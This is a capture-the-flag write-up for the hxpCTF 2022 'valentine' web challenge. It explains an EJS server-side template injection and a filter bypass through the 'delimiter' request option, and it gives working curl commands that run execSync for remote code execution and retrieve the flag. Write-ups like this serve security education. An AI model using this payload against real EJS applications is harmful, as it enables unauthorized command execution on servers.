---
title: valentine - hxpCTF 2022
date: 2023-03-15 17:30:38
author: sk4d
author_url: https://twitter.com/RahulSundar8
categories:
  - Web
tags:
  - hxpCTF
---

**tl;dr**

 - SSTI in the valentine card
 - bypass filter by setting ejs delimiter option
 - RCE :yay:


<!--more-->

**Challenge Points**: 80
**No. of solves**: 116
**Solved by**: [sk4d](https://twitter.com/RahulSundar8)

## intro

I played hxpCTF 2023 last weekend with my team **bi0s**. There a were a lot of awesome web challenges. I have worked on most of the web challenges and this is the write-up for the challenge valentine

## Initial analysis

The application lets us to create a fully customisable valentines card. The application asks us to personalize our card using the `<%= name %>` tags and it gets replaced with the value in the name parameter we send to the template, this can be seen in the source

![image.png](snip.png)

here we can see that our input is passed to the tmpl varible on line number 22 and then on line number 36 , tmpl is written to a ejs template file. This template is later rendered

![image.png](test.png)

in line number 60 which results in an ejs SSTI. This looks easy but no :) there is a filter on line number 24 which blocks every templates other than `<%= name %>`

![image.png](filter.png)

this filter checks for the occurences of `<%` in our template and from there takes the next 11 characters and checks if it matches the string `<%= name %>` and if this check fails the program returns 400. So we basically can't pass anything other than `<%= name %>` in our template.

## Exploitation

We found this interesting [blog](https://eslam.io/posts/ejs-server-side-template-injection-rce/) by Eslam Salem which explained an interesting feature in ejs which allows us to overwrite the template options with the request parameters. This happens because ejs merges our parameters with the options object if the options object is empty and our request has valid option names as params
[libs/utils.js:135](https://github.com/mde/ejs/blob/80bf3d7dcc20dffa38686a58b4e0ba70d5cac8a1/lib/utils.js#L135-L143)
```js
var _OPTS_PASSABLE_WITH_DATA = ['delimiter', 'scope', 'context', 'debug', 'compileDebug',
  'client', '_with', 'rmWhitespace', 'strict', 'filename', 'async'];
```
we can see the option called `delimiter` which enables us to use custom characters in our ejs tags to make templates, You can read about the different ejs options [here](https://www.npmjs.com/package/ejs?#:~:text=cache%20Compiled%20functions%20are%20cached%2C%20requires%20filename). This is exactly what we were looking for and we can use this feature to bypass the filter in line 24 by setting a custom delimiter like `delimiter=?` and then we can execute payloads like ``<?= process.mainModule.require(\'child_process\').execSync(\'/readflag\').toString() ?> `` to read the flag

## Payload

```sh
curl -i -s -k -X $'POST' \
    -H $'Host: localhost:9086' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 99' -H $'Origin: http://localhost:9086' -H $'Connection: close' -H $'Referer: http://localhost:9086/' -H $'Upgrade-Insecure-Requests: 1' \
    --data-binary $'tmpl=<%=+name+%><?=+process.mainModule.require(\'child_process\').execSync(\'/readflag\').toString()+?>' \
    $'http://91.107.238.232:9086/template'
```
```sh
curl -i -s -k -X $'GET' \
    -H $'Host: localhost:9086' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Origin: http://localhost:9086' -H $'Connection: close' -H $'Referer: http://localhost:9086/' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://91.107.238.232:9086/f8a6a7de-9649-42b7-a3e9-f216d73a9d6f?name=asdf&delimiter=?'
```
flag
```
hxp{W1ll_u_b3_my_V4l3nt1ne?}
```

## Closing thoughts

Thanks to the hxpCTF 2022 `-_(0_0)_-` organizers. The challenges were fun and we learnt a ton :)
